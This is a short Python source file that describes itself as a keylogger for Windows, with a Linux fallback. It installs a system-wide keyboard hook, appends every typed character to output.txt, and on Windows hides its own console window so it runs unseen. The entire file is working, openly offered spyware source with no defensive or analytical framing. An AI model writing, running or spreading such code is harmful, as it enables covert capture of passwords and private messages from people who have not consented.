# Python code for keylogger 
# to be used in windows
import platform
system = platform.system()
print(system)
isWindows = system == 'Windows'
if isWindows:
    import win32api
    import win32console 
    import win32gui
    import pyHook
    import pythoncom
else:
    import pyxhook
import logging


log = 'output.txt'
escape = {
    9: '\t',
    13: '\n'
    }
def OnKeyboardEvent(event):
    
    if event.Ascii >= 32:
        c = chr(event.Ascii)
        with open(log, 'a+') as f:
            f.write(c)
    elif event.Ascii in escape:
        with open(log, 'a+') as f:
            f.write(escape[event.Ascii])
    return True    
def main():
    # create a hook manager object
    hm = None
    if isWindows:
        win = win32console.GetConsoleWindow() 
        win32gui.ShowWindow(win, 0) 
        hm = pyHook.HookManager()
    else:
        hm = pyxhook.HookManager()
    hm.KeyDown = OnKeyboardEvent 
    # set the hook 
    hm.HookKeyboard() 
    # wait forever
    if isWindows:
        pythoncom.PumpMessages()
    else:
        try:
            hm.start()         # start the hook 
        except KeyboardInterrupt: 
            # User cancelled from command line. 
            pass
        except Exception as ex:
            pass
main()